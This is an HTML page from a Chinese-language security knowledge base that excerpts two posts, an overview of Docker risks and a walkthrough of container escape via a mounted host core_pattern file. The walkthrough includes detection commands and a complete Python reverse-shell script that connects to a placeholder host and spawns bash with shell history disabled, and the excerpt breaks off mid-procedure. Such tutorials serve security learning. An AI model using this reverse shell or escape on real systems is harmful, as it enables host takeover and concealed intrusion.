<!DOCTYPE html>
<html lang="zh-CN" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>Docker安全 | My Hugo Knowledgebase</title>

    <link rel="stylesheet" href="/css/main.css">


      <script src="/js/main.js"></script>


</head>
<body>
  <header>
    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
    Theme
  </button>
</div>

  </header>
  <main>
    
  <h1>Docker安全</h1>
  
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/">Docker安全概览</a></h2>
      <h1 id="docker安全概览">Docker安全概览</h1>
<p>前面的文章已经简单介绍了docker容器相关概念，docker的使用对于接触过ctf出题的人来说还是相对熟悉了，这里也不做过多介绍，接下来从安全的角度来分析一下docker</p>
<h2 id="docker面临的风险">Docker面临的风险</h2>
<h3 id="镜像风险">镜像风险</h3>
<p>镜像的内容是由用户进行配置的，所以有可能造成一些安全问题</p>
<h4 id="不安全的第三方组件">不安全的第三方组件</h4>
<p>比如在镜像中引入了一些具有严重nday的组件，毫无疑问，这个镜像也就存在漏洞了</p>
<h4 id="不安全的镜像">不安全的镜像</h4>
<p>类似供应链攻击，在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了</p>
<h4 id="敏感信息泄漏">敏感信息泄漏</h4>
<p>如果在镜像开发完毕后没有删除自己配置的api key、AK/SK等，那么如果别人获取到该镜像就可能造成敏感信息泄漏</p>
<h3 id="活动中的容器风险">活动中的容器风险</h3>
<p>容器在运行时也有一些能够用户自定义的配置，这些配置不当同样可能造成风险</p>
<h4 id="不安全的容器应用">不安全的容器应用</h4>
<p>比如映射出来的端口的服务存在漏洞，那么自然会导致风险</p>
<h4 id="不受限制的资源共享">不受限制的资源共享</h4>
<p>容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险</p>
<h4 id="不安全的配置挂载">不安全的配置/挂载</h4>
<p>正常来说，容器有两大隔离机制：</p>
<ul>
<li>linux命名空间：实现文件系统、网络、进程、主机名等方面的隔离</li>
<li>linux控制组：实现CPU、内存、硬盘等方面的隔离</li>
</ul>
<p>而配置不当会导致容器本身隔离机制失效：</p>
<ul>
<li>&ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破</li>
<li>&ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破</li>
<li>&ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破</li>
<li>&ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破</li>
</ul>
<h3 id="容器管理程序接口风险">容器管理程序接口风险</h3>
<p>Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket</p>
<h4 id="unix-socket">UNIX socket</h4>
<p>风险主要在于Docker守护进程默认以宿主机的root权限运行，说到这里其实熟悉后渗透的师傅都能想到，可以利用这一点进行提权，除此之外我们还可以利用这点进行容器逃逸，这类风险有两个利用场景</p>
<ul>
<li>
<p><strong>普通用户被加到Docker用户组内</strong></p>
<p>如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限</p>
</li>
<li>
<p><strong>Unix socket挂载到容器内部</strong></p>
<p>有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，渗透测试人员就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限</p>
    </section>
  
    <section>
      <h2><a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/">Docker逃逸手法大全</a></h2>
      <h1 id="docker逃逸手法大全">Docker逃逸手法大全</h1>
<p>Docker相关安全风险更多集中在Docker逃逸方面</p>
<p>和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件</p>
<h2 id="判断是否为容器环境">判断是否为容器环境</h2>
<p>在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：<a href="https://www.cnblogs.com/yuy0ung/articles/18220591">快速识别虚拟主机、Docker和K8s集群环境</a></p>
<p>不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ls -al /.dockerenv
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331160431814.png" alt="image-20250331160431814"></p>
<p>确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check</p>
<h2 id="挂载宿主机procfs逃逸">挂载宿主机procfs逃逸</h2>
<h3 id="基础概念">基础概念</h3>
<p>procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件</p>
<p>user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID</p>
<p>而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：</p>
<p>从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行</p>
<h3 id="环境搭建">环境搭建</h3>
<p>创建容器并挂载/proc目录：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
</span></span></code></pre></div><p>搭建完毕</p>
<h3 id="信息搜集">信息搜集</h3>
<p>如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>find / -name core_pattern
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331165144667.png" alt="image-20250331165144667"></p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>找到当前容器在主机下的绝对路径：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat /proc/mounts | xargs -d <span style="color:#e6db74">&#39;,&#39;</span> -n <span style="color:#ae81ff">1</span> | grep workdir
</span></span></code></pre></div><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331165346849.png" alt="image-20250331165346849"></p>
<p>可以看到绝对路径为<code>/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work</code></p>
<p>接下来安装vim和gcc：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>apt-get update -y <span style="color:#f92672">&amp;&amp;</span> apt-get install vim gcc -y
</span></span></code></pre></div><p>然后创建一个python脚本用于反弹shell：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span>  os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pty
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;xx.xx.xx.xx&#34;</span>
</span></span><span style="display:flex;"><span>lport <span style="color:#f92672">=</span> <span style="color:#ae81ff">7777</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>   s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>   s<span style="color:#f92672">.</span>connect((lhost, lport))
</span></span><span style="display:flex;"><span>   os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>   os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>   os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>   os<span style="color:#f92672">.</span>putenv(<span style="color:#e6db74">&#34;HISTFILE&#34;</span>, <span style="color:#e6db74">&#39;/dev/null&#39;</span>)
</span></span><span style="display:flex;"><span>   pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># os.remove(&#39;/tmp/.shell.py&#39;)</span>
</span></span><span style="display:flex;"><span>   s<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>   main()
</span></span></code></pre></div><p>赋予执行权限：</p>
    </section>
  

  </main>
  <footer>
    <p>Copyright 2025. All rights reserved.</p>

  </footer>
</body>
</html>
